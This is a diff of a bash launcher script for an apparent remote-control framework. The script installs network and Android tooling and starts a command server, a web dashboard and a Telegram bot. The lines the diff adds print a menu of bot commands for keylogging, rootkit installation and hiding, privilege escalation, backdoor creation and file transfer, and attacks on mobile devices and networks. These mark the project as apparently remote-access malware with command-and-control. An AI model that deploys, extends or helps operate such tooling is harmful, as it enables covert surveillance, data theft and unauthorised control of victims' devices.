@@ -2,7 +2,7 @@
 
 # ========================================
 # Advanced Remote Control System
-# Unified Startup Script - Updated
+# Complete Auto Startup Script
 # ========================================
 
 set -e
@@ -12,6 +12,8 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
 NC='\033[0m' # No Color
 
 # Function to print colored output
@@ -33,102 +35,94 @@ print_header() {
     echo -e "${BLUE}================================${NC}"
 }
 
-# Function to check if Python3 is available
-check_python() {
+print_success() {
+    echo -e "${GREEN}✅ $1${NC}"
+}
+
+print_fail() {
+    echo -e "${RED}❌ $1${NC}"
+}
+
+# Function to check system requirements
+check_requirements() {
+    print_header "Checking System Requirements"
+    
+    # Check Python
     if command -v python3 &> /dev/null; then
-        print_status "Python3 found: $(python3 --version)"
-        return 0
+        print_success "Python3: $(python3 --version)"
     else
-        print_error "Python3 not found. Please install Python 3.9+"
-        return 1
+        print_fail "Python3 not found"
+        exit 1
     fi
-}
-
-# Function to check if Node.js is available
-check_node() {
+    
+    # Check Node.js
     if command -v node &> /dev/null; then
-        print_status "Node.js found: $(node --version)"
-        return 0
+        print_success "Node.js: $(node --version)"
     else
-        print_error "Node.js not found. Please install Node.js"
-        return 1
+        print_fail "Node.js not found"
+        exit 1
     fi
-}
-
-# Function to check if npm is available
-check_npm() {
+    
+    # Check npm
     if command -v npm &> /dev/null; then
-        print_status "npm found: $(npm --version)"
-        return 0
+        print_success "npm: $(npm --version)"
     else
-        print_error "npm not found. Please install npm"
-        return 1
+        print_fail "npm not found"
+        exit 1
     fi
-}
-
-# Function to check if pyenv is available
-check_pyenv() {
+    
+    # Check pyenv
     if command -v pyenv &> /dev/null; then
-        print_status "pyenv found: $(pyenv --version)"
-        return 0
+        print_success "pyenv: $(pyenv --version)"
     else
-        print_warning "pyenv not found. TensorFlow may not work properly"
-        return 1
+        print_warning "pyenv not found - TensorFlow may not work"
     fi
+    
+    print_success "All basic requirements met"
 }
 
-# Function to install Python dependencies
-install_python_deps() {
-    print_status "Installing Python dependencies..."
+# Function to install all dependencies
+install_dependencies() {
+    print_header "Installing Dependencies"
     
-    # Install system-wide dependencies
-    pip3 install --break-system-packages websockets flask psutil python-nmap scapy paramiko cryptography adb-shell numpy pandas scikit-learn matplotlib seaborn asyncio schedule
+    # Install Python system dependencies
+    print_status "Installing Python system dependencies..."
+    pip3 install --break-system-packages websockets flask psutil python-nmap scapy paramiko cryptography adb-shell numpy pandas scikit-learn matplotlib seaborn asyncio schedule pyTelegramBotAPI requests
     
-    # Install bot requirements
+    # Install bot dependencies
     if [ -f "remote-control-system/telegram-bot/requirements.txt" ]; then
+        print_status "Installing bot dependencies..."
         cd remote-control-system/telegram-bot
         pip3 install --break-system-packages -r requirements.txt
         cd ../..
-        print_status "Bot dependencies installed successfully"
     fi
     
-    # Install command server requirements
+    # Install command server dependencies
     if [ -f "remote-control-system/command-server/requirements.txt" ]; then
+        print_status "Installing command server dependencies..."
         cd remote-control-system/command-server
         pip3 install --break-system-packages -r requirements.txt
         cd ../..
-        print_status "Command server dependencies installed successfully"
     fi
     
     # Install TensorFlow if pyenv is available
-    if check_pyenv; then
+    if command -v pyenv &> /dev/null; then
         print_status "Installing TensorFlow in pyenv environment..."
         pyenv exec pip install tensorflow
-        print_status "TensorFlow installed successfully"
+        print_success "TensorFlow installed successfully"
     else
         print_warning "TensorFlow installation skipped (pyenv not available)"
     fi
-}
-
-# Function to install Node.js dependencies
-install_node_deps() {
-    print_status "Installing Node.js dependencies..."
     
-    # Install web interface dependencies
+    # Install Node.js dependencies
     if [ -f "remote-control-system/web-interface/package.json" ]; then
+        print_status "Installing web interface dependencies..."
         cd remote-control-system/web-interface
         npm install
         cd ../..
-        print_status "Web interface dependencies installed successfully"
     fi
     
-    # Install command server Node.js dependencies if any
-    if [ -f "remote-control-system/command-server/package.json" ]; then
-        cd remote-control-system/command-server
-        npm install
-        cd ../..
-        print_status "Command server Node.js dependencies installed successfully"
-    fi
+    print_success "All dependencies installed"
 }
 
 # Function to create necessary directories
@@ -139,8 +133,9 @@ create_directories() {
     mkdir -p data
     mkdir -p remote-control-system/external_tools
     mkdir -p remote-control-system/database
+    mkdir -p remote-control-system/logs
     
-    print_status "Directories created successfully"
+    print_success "Directories created"
 }
 
 # Function to start command server
@@ -150,7 +145,7 @@ start_command_server() {
     cd remote-control-system/command-server
     
     # Use pyenv if available, otherwise use system Python
-    if check_pyenv; then
+    if command -v pyenv &> /dev/null; then
         pyenv exec python3 server.py > ../../logs/command-server.log 2>&1 &
     else
         python3 server.py > ../../logs/command-server.log 2>&1 &
@@ -160,7 +155,7 @@ start_command_server() {
     echo $COMMAND_SERVER_PID > ../../.command-server.pid
     cd ../..
     
-    print_status "Command server started (PID: $COMMAND_SERVER_PID)"
+    print_success "Command server started (PID: $COMMAND_SERVER_PID)"
     sleep 3
 }
 
@@ -168,28 +163,31 @@ start_command_server() {
 start_web_interface() {
     print_status "Starting web interface..."
     
-    cd remote-control-system/web-interface
-    
-    # Check if it's a Node.js or Python web interface
-    if [ -f "server.js" ]; then
-        node server.js > ../../logs/web-interface.log 2>&1 &
-    elif [ -f "web_dashboard.py" ]; then
-        python3 web_dashboard.py > ../../logs/web-interface.log 2>&1 &
+    # Check if web dashboard exists in root
+    if [ -f "web_dashboard.py" ]; then
+        python3 web_dashboard.py > logs/web-interface.log 2>&1 &
+        WEB_INTERFACE_PID=$!
+        echo $WEB_INTERFACE_PID > .web-interface.pid
+        print_success "Web interface started (PID: $WEB_INTERFACE_PID)"
     else
-        # Copy the main web dashboard if it exists
-        if [ -f "../../web_dashboard.py" ]; then
-            python3 ../../web_dashboard.py > ../../logs/web-interface.log 2>&1 &
+        # Check in web-interface directory
+        cd remote-control-system/web-interface
+        
+        if [ -f "server.js" ]; then
+            node server.js > ../../logs/web-interface.log 2>&1 &
+        elif [ -f "web_dashboard.py" ]; then
+            python3 web_dashboard.py > ../../logs/web-interface.log 2>&1 &
         else
             print_error "Web interface not found"
             return 1
         fi
+        
+        WEB_INTERFACE_PID=$!
+        echo $WEB_INTERFACE_PID > ../../.web-interface.pid
+        cd ../..
+        print_success "Web interface started (PID: $WEB_INTERFACE_PID)"
     fi
     
-    WEB_INTERFACE_PID=$!
-    echo $WEB_INTERFACE_PID > ../../.web-interface.pid
-    cd ../..
-    
-    print_status "Web interface started (PID: $WEB_INTERFACE_PID)"
     sleep 2
 }
 
@@ -200,7 +198,7 @@ start_telegram_bot() {
     cd remote-control-system/telegram-bot
     
     # Use pyenv if available, otherwise use system Python
-    if check_pyenv; then
+    if command -v pyenv &> /dev/null; then
         pyenv exec python3 bot.py > ../../logs/telegram-bot.log 2>&1 &
     else
         python3 bot.py > ../../logs/telegram-bot.log 2>&1 &
@@ -210,32 +208,32 @@ start_telegram_bot() {
     echo $TELEGRAM_BOT_PID > ../../.telegram-bot.pid
     cd ../..
     
-    print_status "Telegram bot started (PID: $TELEGRAM_BOT_PID)"
+    print_success "Telegram bot started (PID: $TELEGRAM_BOT_PID)"
 }
 
 # Function to check system status
 check_system_status() {
-    print_header "System Status Check"
+    print_header "System Status"
     
     # Check command server
     if [ -f ".command-server.pid" ] && kill -0 $(cat .command-server.pid) 2>/dev/null; then
-        print_status "✅ Command server: Running (PID: $(cat .command-server.pid))"
+        print_success "Command server: Running (PID: $(cat .command-server.pid))"
     else
-        print_error "❌ Command server: Not running"
+        print_fail "Command server: Not running"
     fi
     
     # Check web interface
     if [ -f ".web-interface.pid" ] && kill -0 $(cat .web-interface.pid) 2>/dev/null; then
-        print_status "✅ Web interface: Running (PID: $(cat .web-interface.pid))"
+        print_success "Web interface: Running (PID: $(cat .web-interface.pid))"
     else
-        print_error "❌ Web interface: Not running"
+        print_fail "Web interface: Not running"
     fi
     
     # Check telegram bot
     if [ -f ".telegram-bot.pid" ] && kill -0 $(cat .telegram-bot.pid) 2>/dev/null; then
-        print_status "✅ Telegram bot: Running (PID: $(cat .telegram-bot.pid))"
+        print_success "Telegram bot: Running (PID: $(cat .telegram-bot.pid))"
     else
-        print_error "❌ Telegram bot: Not running"
+        print_fail "Telegram bot: Not running"
     fi
     
     echo ""
@@ -247,7 +245,7 @@ check_system_status() {
 
 # Function to stop the system
 stop_system() {
-    print_header "Stopping Advanced Remote Control System"
+    print_header "Stopping System"
     
     # Stop command server
     if [ -f ".command-server.pid" ]; then
@@ -275,38 +273,32 @@ stop_system() {
     pkill -f "web_dashboard.py" 2>/dev/null || true
     pkill -f "bot.py" 2>/dev/null || true
     
-    print_status "System stopped successfully"
+    print_success "System stopped successfully"
 }
 
-# Function to start the system
+# Function to restart the system
+restart_system() {
+    print_header "Restarting System"
+    stop_system
+    sleep 2
+    start_system
+}
+
+# Function to start the complete system
 start_system() {
-    print_header "Starting Advanced Remote Control System"
+    print_header "🚀 Starting Advanced Remote Control System"
     
-    # Check dependencies
-    print_status "Checking system dependencies..."
-    
-    if ! check_python; then
-        exit 1
-    fi
-    
-    if ! check_node; then
-        exit 1
-    fi
-    
-    if ! check_npm; then
-        exit 1
-    fi
+    # Check requirements
+    check_requirements
     
     # Create directories
     create_directories
     
     # Install dependencies
-    print_status "Installing dependencies..."
-    install_python_deps
-    install_node_deps
+    install_dependencies
     
     # Start components
-    print_status "Starting system components..."
+    print_header "Starting System Components"
     start_command_server
     start_web_interface
     start_telegram_bot
@@ -314,18 +306,23 @@ start_system() {
     # Show status
     check_system_status
     
-    print_header "System Started Successfully!"
+    print_header "🎉 System Started Successfully!"
     echo "🎯 All components are running"
     echo "📊 Check logs in the 'logs' directory"
     echo "🛑 Use '$0 stop' to stop the system"
-}
-
-# Function to restart the system
-restart_system() {
-    print_header "Restarting Advanced Remote Control System"
-    stop_system
-    sleep 2
-    start_system
+    echo ""
+    echo "📋 Available Commands:"
+    echo "  🔑 /keylogger start|stop|data"
+    echo "  🔧 /rootkit install|escalate|hide"
+    echo "  🚪 /backdoor create|execute|transfer"
+    echo "  💻 /system info|control|monitor"
+    echo "  📱 /mobile attack|control|extract"
+    echo "  🌐 /network scan|attack|monitor"
+    echo ""
+    echo "🔗 Access URLs:"
+    echo "  🌐 Web Dashboard: http://localhost:8081"
+    echo "  🔧 Command Server: http://localhost:10001"
+    echo "  🤖 Telegram Bot: Check logs for connection status"
 }
 
 # Function to show help
@@ -335,7 +332,7 @@ show_help() {
     echo "Usage: $0 [OPTION]"
     echo ""
     echo "Options:"
-    echo "  start     - Start the system"
+    echo "  start     - Start the complete system"
     echo "  stop      - Stop the system"
     echo "  restart   - Restart the system"
     echo "  status    - Show system status"
@@ -368,11 +365,7 @@ case "${1:-help}" in
         check_system_status
         ;;
     "check")
-        print_header "System Requirements Check"
-        check_python
-        check_node
-        check_npm
-        check_pyenv
+        check_requirements
         ;;
     "help"|*)
         show_help
